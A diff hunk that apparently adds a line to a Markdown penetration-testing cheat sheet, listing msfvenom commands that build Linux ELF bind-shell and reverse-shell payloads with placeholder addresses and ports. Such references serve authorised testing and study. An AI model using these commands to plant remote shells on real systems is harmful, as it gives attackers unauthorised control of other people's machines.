@@ -20,6 +20,7 @@
   - Bind shell
     - msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > shell.elf
   - Reverse shell
+    - msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
     
 
 - ## Windows
